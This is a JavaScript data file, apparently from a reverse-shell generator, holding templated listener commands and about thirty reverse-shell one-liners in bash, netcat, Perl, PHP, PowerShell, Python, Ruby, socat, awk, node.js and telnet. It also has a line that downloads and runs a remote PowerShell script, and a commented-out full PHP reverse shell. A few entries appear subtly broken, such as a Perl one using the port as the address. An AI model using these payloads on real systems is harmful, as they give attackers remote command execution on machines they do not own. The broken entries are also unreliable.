const rsgData = {

    listenerCommands: [
        ['pwncat', 'python3 -m pwncat -lp {port}'],
        ['nc', 'nc -lvnp {port}'],
        ['rlwrap + nc', 'rlwrap nc -lvnp {port}'],
        ['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'],
        ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
        ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}']
    ],

    shells: ['sh', 'bash', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],
    
    reverseShellsCommands: [
        ['Bash -i', '{shell} -i >& /dev/tcp/{ip}/{port} 0>&1'],
        ['Bash 196', '0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196'],
        ['Bash udp', '{shell} -i >& /dev/udp/{ip}/{port} 0>&1'],
        ['nc mkfifo', 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/{shell} -i 2>&1|nc {ip} {port} >/tmp/f'],
        ['nc -e', 'nc -e /bin/{shell} {ip} {port}'],
        ['nc -c', 'nc -c {shell} {ip} {port}'],
        ['ncat -e', 'ncat {ip} {port} -e /bin/{shell} '],
        ['ncat udp', 'ncat {ip} {port} -e /bin/{shell}'],
        ['Perl', 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/{shell} -i");};\''],
        ['Perl no sh', 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{port}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''],
        ['PHP exec', 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/{shell} -i <&3 >&3 2>&3");\''],
        ['PHP shell_exec', 'php -r \'$sock=fsockopen("{ip}",{port});shell_exec("/bin/{shell} -i <&3 >&3 2>&3");\''],
        ['PHP system', 'php -r \'$sock=fsockopen("{ip}",{port});system("/bin/{shell} -i <&3 >&3 2>&3");\''],
        ['PHP passthru', 'php -r \'$sock=fsockopen("{ip}",{port});passthru("/bin/sh -i <&3 >&3 2>&3");\''],
        ['PHP `', 'php -r \'$sock=fsockopen("{ip}",{port});`/bin/sh -i <&3 >&3 2>&3`;\''],
        ['PHP popen', 'php -r \'$sock=fsockopen("{ip}",{port});popen("/bin/sh -i <&3 >&3 2>&3", "r");\''],
        ['Windows ConPty', 'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}'],
        ['PowerShell #1', 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'],
        ['PowerShell #2', 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'],
        ['PowerShell #3 (Base64)', undefined],
        ['Python #1', 'export RHOST="{ip}";export RPORT={port};python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/{shell}")\''],
        ['Python #2', 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/{shell}")\''],
        ['Ruby #1', 'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/{shell} -i <&%d >&%d 2>&%d",f,f,f)\''],
        ['Ruby no sh', 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''],
        ['socat #1', 'socat TCP:{ip}:{port} EXEC:{shell}'],
        ['socat #2 (TTY)', 'socat TCP:{ip}:{port} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane'],
        ['awk', 'awk \'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null'],
        ['node.js', 'require(\'child_process\').exec(\'nc -e /bin/{shell} {ip} {port}\')'],
        ['telnet', 'TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF']
       // fix escaping ['PentestMonkey PHP', '\r\n  <?php\r\n  \/\/ php-reverse-shell - A Reverse Shell implementation in PHP\r\n  \/\/ Copyright (C) 2007 pentestmonkey@pentestmonkey.net\r\n\r\n  set_time_limit (0);\r\n  $VERSION = \"1.0\";\r\n  $ip = \'10.13.0.24\';  \/\/ You have changed this\r\n  $port = 9001;  \/\/ And this\r\n  $chunk_size = 1400;\r\n  $write_a = null;\r\n  $error_a = null;\r\n  $shell = \'uname -a; w; id; \/bin\/sh -i\';\r\n  $daemon = 0;\r\n  $debug = 0;\r\n\r\n  \/\/\r\n  \/\/ Daemonise ourself if possible to avoid zombies later\r\n  \/\/\r\n\r\n  \/\/ pcntl_fork is hardly ever available, but will allow us to daemonise\r\n  \/\/ our php process and avoid zombies.  Worth a try...\r\n  if (function_exists(\'pcntl_fork\')) {\r\n    \/\/ Fork and have the parent process exit\r\n    $pid = pcntl_fork();\r\n    \r\n    if ($pid == -1) {\r\n      printit(\"ERROR: Can\'t fork\");\r\n      exit(1);\r\n    }\r\n    \r\n    if ($pid) {\r\n      exit(0);  \/\/ Parent exits\r\n    }\r\n\r\n    \/\/ Make the current process a session leader\r\n    \/\/ Will only succeed if we forked\r\n    if (posix_setsid() == -1) {\r\n      printit(\"Error: Can\'t setsid()\");\r\n      exit(1);\r\n    }\r\n\r\n    $daemon = 1;\r\n  } else {\r\n    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\r\n  }\r\n\r\n  \/\/ Change to a safe directory\r\n  chdir(\"\/\");\r\n\r\n  \/\/ Remove any umask we inherited\r\n  umask(0);\r\n\r\n  \/\/\r\n  \/\/ Do the reverse shell...\r\n  \/\/\r\n\r\n  \/\/ Open reverse connection\r\n  $sock = fsockopen($ip, $port, $errno, $errstr, 30);\r\n  if (!$sock) {\r\n    printit(\"$errstr ($errno)\");\r\n    exit(1);\r\n  }\r\n\r\n  \/\/ Spawn shell process\r\n  $descriptorspec = array(\r\n    0 => array(\"pipe\", \"r\"),  \/\/ stdin is a pipe that the child will read from\r\n    1 => array(\"pipe\", \"w\"),  \/\/ stdout is a pipe that the child will write to\r\n    2 => array(\"pipe\", \"w\")   \/\/ stderr is a pipe that the child will write to\r\n  );\r\n\r\n  $process = proc_open($shell, $descriptorspec, $pipes);\r\n\r\n  if (!is_resource($process)) {\r\n    printit(\"ERROR: Can\'t spawn shell\");\r\n    exit(1);\r\n  }\r\n\r\n  \/\/ Set everything to non-blocking\r\n  \/\/ Reason: Occsionally reads will block, even though stream_select tells us they won\'t\r\n  stream_set_blocking($pipes[0], 0);\r\n  stream_set_blocking($pipes[1], 0);\r\n  stream_set_blocking($pipes[2], 0);\r\n  stream_set_blocking($sock, 0);\r\n\r\n  printit(\"Successfully opened reverse shell to $ip:$port\");\r\n\r\n  while (1) {\r\n    \/\/ Check for end of TCP connection\r\n    if (feof($sock)) {\r\n      printit(\"ERROR: Shell connection terminated\");\r\n      break;\r\n    }\r\n\r\n    \/\/ Check for end of STDOUT\r\n    if (feof($pipes[1])) {\r\n      printit(\"ERROR: Shell process terminated\");\r\n      break;\r\n    }\r\n\r\n    \/\/ Wait until a command is end down $sock, or some\r\n    \/\/ command output is available on STDOUT or STDERR\r\n    $read_a = array($sock, $pipes[1], $pipes[2]);\r\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\r\n\r\n    \/\/ If we can read from the TCP socket, send\r\n    \/\/ data to process\'s STDIN\r\n    if (in_array($sock, $read_a)) {\r\n      if ($debug) printit(\"SOCK READ\");\r\n      $input = fread($sock, $chunk_size);\r\n      if ($debug) printit(\"SOCK: $input\");\r\n      fwrite($pipes[0], $input);\r\n    }\r\n\r\n    \/\/ If we can read from the process\'s STDOUT\r\n    \/\/ send data down tcp connection\r\n    if (in_array($pipes[1], $read_a)) {\r\n      if ($debug) printit(\"STDOUT READ\");\r\n      $input = fread($pipes[1], $chunk_size);\r\n      if ($debug) printit(\"STDOUT: $input\");\r\n      fwrite($sock, $input);\r\n    }\r\n\r\n    \/\/ If we can read from the process\'s STDERR\r\n    \/\/ send data down tcp connection\r\n    if (in_array($pipes[2], $read_a)) {\r\n      if ($debug) printit(\"STDERR READ\");\r\n      $input = fread($pipes[2], $chunk_size);\r\n      if ($debug) printit(\"STDERR: $input\");\r\n      fwrite($sock, $input);\r\n    }\r\n  }\r\n\r\n  fclose($sock);\r\n  fclose($pipes[0]);\r\n  fclose($pipes[1]);\r\n  fclose($pipes[2]);\r\n  proc_close($process);\r\n\r\n  \/\/ Like print, but does nothing if we\'ve daemonised ourself\r\n  \/\/ (I can\'t figure out how to redirect STDOUT like a proper daemon)\r\n  function printit ($string) {\r\n    if (!$daemon) {\r\n      print \"$string\r\n\";\r\n    }\r\n  }\r\n\r\n  ?> \r\n']

    ],

    specialCommands: {
        'PowerShell payload': '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    }
}